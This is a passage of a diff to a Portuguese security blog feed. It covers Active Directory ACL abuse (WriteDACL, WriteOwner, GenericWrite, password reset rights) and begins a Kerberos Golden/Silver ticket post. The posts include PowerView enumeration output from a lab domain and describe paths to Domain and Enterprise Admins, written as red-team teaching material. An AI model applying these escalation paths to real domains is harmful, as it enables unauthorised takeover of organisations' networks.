-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InheritedObjectType&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;   &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;All&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ObjectDN&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;              &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hnr_biscates&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;OU&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HNR_Groups&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hnr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;local&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ObjectType&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;            &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;All&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IdentityReference&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;     &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;HNR\hnr_nullbyte&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IsInherited&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;           &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ActiveDirectoryRights&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;WriteProperty&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PropagationFlags&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ObjectFlags&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;           &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InheritanceFlags&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ContainerInherit&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InheritanceType&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;       &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;All&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AccessControlType&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;     &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Allow&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ObjectSID&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;             &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;S-1-5-21-3380101520-2231475763-736739948-1109&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+<p>Extended Rights aplicáveis a usuários</p>
 
-&lt;p&gt;&lt;a href=&quot;https://github.com/BloodHoundAD&quot;&gt;BloodHound&lt;/a&gt; attack path, partindo do node HNR\idiotbox, usuário pertencente ao grupo HNR\nullbyte, com o objetivo de obter privilégios do grupo Domain Admins.&lt;/p&gt;
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Extended Right</th>
+      <th style="text-align: left">Description</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">Change Password {ab721a53-1e2f-11d0-9819-00aa0040529b}</td>
+      <td style="text-align: left">Enables you to change the password on a user account. You must know the user’s current password in order to provide them with a new password.</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">Reset Password {00299570-246d-11d0-a768-00aa006e0529}</td>
+      <td style="text-align: left">Enables you to reset the password on a user account. You do not need to know the user’s current password in order to provide them with a new password.</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">Receive As {ab721a56-1e2f-11d0-9819-00aa0040529b}</td>
+      <td style="text-align: left">Exchange right that enables you to receive mail as a given mailbox.</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">Send As {ab721a54-1e2f-11d0-9819-00aa0040529b}</td>
+      <td style="text-align: left">Exchange right that enables you to send mail as the mailbox.</td>
+    </tr>
+  </tbody>
+</table>
 
-&lt;p&gt;&lt;img src=&quot;/assets/img/sample/dacl/bh3.png&quot; alt=&quot;upload-image&quot; /&gt;&lt;/p&gt;
+<p>No cenário abaixo, o usuário HNR\pupilo, possui plenos privilégios para alterar a senha do usuário HNR\tuxtrack. Após alterá-la, o usuário pode executar o cmd.exe através do comando <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525(v%3Dws.11)">runas</a> com o usuário HNR\tuxtrack.</p>
 
-&lt;p&gt;O usuário hnr/idiotbox pertence ao grupo HNR_BISCATES que possui privilégios GenericWrite no grupo HNR_NULLBYTE. Para exemplificar, adicionamos o usuário HNR/palmitao ao grupo hnr_biscates, mas qualquer propriedade pertencente ao objeto poderia ser modificada (ObjectType : All).&lt;/p&gt;
+<p><img src="/assets/img/sample/dacl/fun6.png" alt="upload-image" /></p>
 
-&lt;p&gt;&lt;img src=&quot;/assets/img/sample/dacl/fun3.png&quot; alt=&quot;upload-image&quot; /&gt;&lt;/p&gt;
+<hr />
 
-&lt;h2 id=&quot;writedacl&quot;&gt;WriteDACL&lt;/h2&gt;
+<p>Como apresentado, privilégios podem ser abusados em diversos caminhos, explorando a necessidade de delegá-los dentro de uma infraestrutura corporativa para atender as mais adversas necessidades.</p>
 
-&lt;p&gt;Permissão para modificar DACL. Sendo assim, os usuários contemplados com essa permissão podem alterar quaisquer propriedades do objeto DACL (ACE), concedendo a si próprio qualquer privilégio.&lt;/p&gt;
+<p>Fico a disposição para sanar quaisquer dúvidas, até o próximo!</p>
 
-&lt;p&gt;No exemplo abaixo, o grupo hnr_devs possuiem a permissão WriteDacl no grupo Enterprise Admins.&lt;/p&gt;
-
-&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C:\Users\tuxtrack.HNR\Desktop&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Get-ObjectAcl&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-ResolveGUIDs&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;$_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;objectdn&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-eq&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;CN=Enterprise Admins,CN=Users,DC=hnr,DC=local&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Get-ObjectAcl&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-ResolveGUIDs&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;$_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;objectdn&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-eq&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;CN=Enterprise Admins,CN=Users,DC=hnr,DC=local&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InheritedObjectType&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;   &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;All&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ObjectDN&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;              &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Enterprise&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Admins&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Users&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hnr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;local&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ObjectType&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;            &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;All&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IdentityReference&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;     &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;HNR\hnr_devs&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IsInherited&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;           &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ActiveDirectoryRights&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;WriteDacl&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PropagationFlags&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ObjectFlags&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;           &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InheritanceFlags&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InheritanceType&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;       &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AccessControlType&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;     &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Allow&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ObjectSID&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;             &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;S-1-5-21-3380101520-2231475763-736739948-519&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+<p>Referências:</p>
 
-&lt;p&gt;&lt;a href=&quot;https://github.com/BloodHoundAD&quot;&gt;BloodHound&lt;/a&gt; attack path, partindo do node HNR\neko, usuário pertencente ao grupo HNR\hnr_devs, com o objetivo de obter privilégios do grupo Enterprise Admins e Domain Admins.&lt;/p&gt;
+<p><a href="https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf">An ACE Up The Sleeve</a></p>
 
-&lt;p&gt;&lt;img src=&quot;/assets/img/sample/dacl/bh4.png&quot; alt=&quot;upload-image&quot; /&gt;&lt;/p&gt;
+<p><a href="https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2">Active Directory Rights Enum</a></p>
 
-&lt;p&gt;O ataque consiste em criar uma nova ACE no objeto Enterprise Admins, concedendo totais poderes sobres suas propriedades para o usuário HNR/neko e então adicioná-lo como membro do grupo Enterprise Admins, abusando dos direitos adquiridos.&lt;/p&gt;
+<p><a href="https://docs.microsoft.com/en-us/previous-versions/tn-archive/ff405676(v=msdn.10)">Extended Rights Reference</a></p>]]></content><author><name>tuxtrack</name></author><category term="ACTIVE DIRECTORY" /><category term="REDTEAM" /><category term="WINDOWS" /><category term="ACL" /><summary type="html"><![CDATA[O Microsoft Active Directory possui grupos pré-definidos para delegar permissões a usuários e grupos, porém nem sempre é plausível delegar tantos poderes quando se precisa somente de poucos privilégios. Administradores de sistemas podem delegar permissões para usuários/computadores/grupos do domínio sem que os mesmos façam parte de um grupo privilegiado, assim, usuários poderão executar tarefas como, adicionar um usuário/grupo a um determinado grupo, alterar a senha de usuários e modificar propriedades inerentes ao objeto em questão através de ACL’s.]]></summary></entry><entry><title type="html">Golden &amp;amp; Silver</title><link href="http://localhost:4000/2020/03/02/g&s.html" rel="alternate" type="text/html" title="Golden &amp;amp; Silver" /><published>2020-03-02T12:00:00+00:00</published><updated>2020-03-02T12:00:00+00:00</updated><id>http://localhost:4000/2020/03/02/g&amp;s</id><content type="html" xml:base="http://localhost:4000/2020/03/02/g&amp;s.html"><![CDATA[<p>Como mostrado no <a href="https://tuxtrack.github.io/posts/kerberos101/">post anterior</a>, em meio ao processo de autenticação de um usuário/computador em um ambiente Microsoft Active Directory utilizando o protocolo Kerberos, uma troca de informações ocorre para validar a conta em questão.</p>
 
-&lt;p&gt;&lt;img src=&quot;/assets/img/sample/dacl/fun4.png&quot; alt=&quot;upload-image&quot; /&gt;&lt;/p&gt;
+<p><img src="https://raw.githubusercontent.com/tuxtrack/tuxtrack.github.io/master/assets/img/sample/ges/kerb.png" alt="" /></p>
 
-&lt;p&gt;O cenário exibido acima e no próximo tópico são meramente ilustrativos. Contas e Grupos definidos como &lt;a href=&quot;https://docs.microsoft.com/pt-br/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory#appendix-c-protected-accounts-and-groups-in-active-directory&quot;&gt;Protected Accounts&lt;/a&gt;, possuem mecanismos de segurança que verificam sua integridade automaticamente a cada 60 minutos, resetando suas permissões, comparando-as com as permissões do objeto AdminSDHolder. Esse processo é chamado de &lt;a href=&quot;(https://docs.microsoft.com/pt-br/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory#sdprop)&quot;&gt;Security Description Propagation&lt;/a&gt; ou &lt;a href=&quot;https://docs.microsoft.com/pt-br/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory#sdprop&quot;&gt;SDProp&lt;/a&gt;.&lt;/p&gt;
+<p>Ao ocorrer a solicitação de acesso a algum recurso existente no domínio utilizando o protocolo Kerberos, automaticamente será solicitado ao KDC um ticket do tipo TGT (Ticket-Granting Ticket). Caso a conta seja válida, o KDC retornará o ticket assinado/criptografado pela conta KRBTGT.</p>
 
-&lt;p&gt;&lt;a href=&quot;https://docs.microsoft.com/pt-br/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory#protected-accounts-and-groups-in-active-directory-by-operating-system&quot;&gt;Contas e grupos protegidos no Active Directory pelo sistema operacional&lt;/a&gt;&lt;/p&gt;
+<blockquote>
+  <p>KRBTGT is also the security principal name used by the KDC for a Windows Server domain, as specified by RFC 4120. The KRBTGT account is the entity for the KRBTGT security principal, and it is created automatically when a new domain is created. <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn745899(v=ws.11)">MS Docs</a></p>
+</blockquote>
 
-&lt;h2 id=&quot;writeowner&quot;&gt;WriteOwner&lt;/h2&gt;
+<p><img src="https://raw.githubusercontent.com/tuxtrack/tuxtrack.github.io/master/assets/img/sample/ges/krbtgt.png" alt="" /></p>
 
-&lt;p&gt;Write Owner é o privilégio destinado ao Owner da DACL de um objeto no Active Directory. Ao ser criada a permissão, ela pode ser designada via ACE a apenas algumas propriedades do objeto ou a todas. O Owner possui GenericAll sobre todas as propridades do objeto, garantindo assim ao atacantes plenos poderes para executar diversas tarefas que podem comprometer o objeto.&lt;/p&gt;
+<h3 id="golden-tickets">Golden Tickets</h3>
 
-&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C:\Users\tuxtrack.HNR\Desktop&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Get-ObjectAcl&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-ResolveGUIDs&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;$_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;objectdn&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-eq&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;CN=Domain Admins,CN=Users,DC=hnr,DC=local&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InheritedObjectType&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;   &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;All&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ObjectDN&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;              &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Domain&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Admins&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Users&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hnr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;local&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ObjectType&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;            &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;All&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IdentityReference&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;     &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;HNR\hnr_admins&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IsInherited&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;           &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ActiveDirectoryRights&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;WriteOwner&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PropagationFlags&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ObjectFlags&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;           &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InheritanceFlags&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ContainerInherit&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InheritanceType&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;       &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;All&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AccessControlType&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;     &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Allow&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
